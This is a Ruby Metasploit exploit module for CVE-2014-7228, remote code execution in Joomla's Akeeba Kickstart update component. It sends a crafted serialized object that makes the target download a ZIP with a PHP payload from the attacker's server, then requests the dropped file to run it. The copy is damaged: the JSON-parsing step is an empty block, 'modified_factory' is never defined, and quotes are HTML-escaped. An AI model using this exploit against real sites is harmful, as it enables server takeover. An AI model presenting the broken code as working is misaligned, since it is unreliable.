# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;
require &#039;rex/zip&#039;
require &#039;json&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Exploit::FileDropper

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "Joomla Akeeba Kickstart Unserialize Remote Code Execution",
      &#039;Description&#039;    => %q{
        This module exploits a vulnerability found in Joomla! through 2.5.25, 3.2.5 and earlier
        3.x versions and 3.3.0 through 3.3.4 versions. The vulnerability affects the Akeeba
        component, which is responsible for Joomla! updates. Nevertheless it is worth to note
        that this vulnerability is only exploitable during the update of the Joomla! CMS.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Johannes Dahse&#039;,               # Vulnerability discovery
          &#039;us3r777 <us3r777[at]n0b0.so>&#039;  # Metasploit module
        ],
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2014-7228&#039; ],
          [ &#039;URL&#039;, &#039;http://developer.joomla.org/security/595-20140903-core-remote-file-inclusion.html&#039;],
          [ &#039;URL&#039;, &#039;https://www.akeebabackup.com/home/news/1605-security-update-sep-2014.html&#039;],
        ],
      &#039;Platform&#039;       => [&#039;php&#039;],
      &#039;Arch&#039;           => ARCH_PHP,
      &#039;Targets&#039;        =>
        [
          [ &#039;Joomla < 2.5.25 / Joomla 3.x < 3.2.5 / Joomla 3.3.0 < 3.3.4&#039;, {} ]
        ],
      &#039;Stance&#039;         => Msf::Exploit::Stance::Aggressive,
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => "Sep 29 2014",
      &#039;DefaultTarget&#039;  => 0))

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The base path to Joomla&#039;, &#039;/joomla&#039;]),
        OptInt.new(&#039;HTTPDELAY&#039;,    [false, &#039;Seconds to wait before terminating web server&#039;, 5])
      ], self.class)
  end

  def check
    res = send_request_cgi(
      &#039;uri&#039; => normalize_uri(target_uri, &#039;administrator&#039;, &#039;components&#039;, &#039;com_joomlaupdate&#039;, &#039;restoration.php&#039;)
    )

    if res && res.code == 200
      return Exploit::CheckCode::Detected
    end

    Exploit::CheckCode::Safe
  end

  def primer
    srv_uri = "#{get_uri}/#{rand_text_alpha(4 + rand(3))}.zip"

    php_serialized_akfactory = &#039;O:9:"AKFactory":1:{s:18:"&#039; + "\x00" + &#039;AKFactory&#039; + "\x00" + &#039;varlist";a:2:{s:27:"kickstart.security.password";s:0:"";s:26:"kickstart.setup.sourcefile";s:&#039; + srv_uri.length.to_s + &#039;:"&#039; + srv_uri + &#039;";}}&#039;
    php_filename = rand_text_alpha(8 + rand(8)) + &#039;.php&#039;

    # Create the zip archive
    print_status("Creating archive with file #{php_filename}")
    zip_file = Rex::Zip::Archive.new
    zip_file.add_file(php_filename, payload.encoded)
    @zip = zip_file.pack

    print_status("#{peer} - Sending PHP serialized object...")
    res = send_request_cgi({
      &#039;uri&#039;       => normalize_uri(target_uri, &#039;administrator&#039;, &#039;components&#039;, &#039;com_joomlaupdate&#039;, &#039;restore.php&#039;),
      &#039;vars_get&#039;  => {
        &#039;task&#039;    => &#039;stepRestore&#039;,
        &#039;factory&#039; => Rex::Text.encode_base64(php_serialized_akfactory)
      }
    })

    unless res && res.code == 200 && res.body && res.body =~ /^###\{"status":true.*\}###/
      print_status("#{res.code}\n#{res.body}")
      fail_with(Failure::Unknown, "#{peer} - Unexpected response")
    end

    # Second step: modify the currentPartNumber within the returned serialized AKFactory
    json = /###(.*)###/.match(res.body)[1]
    begin
    rescue JSON::ParserError
      fail_with(Failure::Unknown, "#{peer} - Unexpected response, cannot parse JSON")
    end


    print_status("#{peer} - Sending initialized and modified AKFactory...")
    res = send_request_cgi({
      &#039;uri&#039;       => normalize_uri(target_uri, &#039;administrator&#039;, &#039;components&#039;, &#039;com_joomlaupdate&#039;, &#039;restore.php&#039;),
      &#039;vars_get&#039;  => {
        &#039;task&#039;    => &#039;stepRestore&#039;,
        &#039;factory&#039; => Rex::Text.encode_base64(modified_factory)
      }
    })

    unless res && res.code == 200 && res.body && res.body =~ /^###\{"status":true.*\}###/
      fail_with(Failure::Unknown, "#{peer} - Unexpected response")
    end

    register_files_for_cleanup(php_filename)

    print_status("#{peer} - Executing payload...")
    send_request_cgi({
      &#039;uri&#039; => normalize_uri(target_uri, &#039;administrator&#039;, &#039;components&#039;, &#039;com_joomlaupdate&#039;, php_filename)
    }, 2)

  end

  def exploit
    begin
      Timeout.timeout(datastore[&#039;HTTPDELAY&#039;]) { super }
    rescue Timeout::Error
      # When the server stops due to our timeout, this is raised
    end
  end

  # Handle incoming requests from the server
  def on_request_uri(cli, request)
    if @zip && request.uri =~ /\.zip$/
      print_status("Sending the ZIP archive...")
      send_response(cli, @zip, { &#039;Content-Type&#039; => &#039;application/zip&#039; })
      return
    end

    print_status("Sending not found...")
    send_not_found(cli)
  end

end

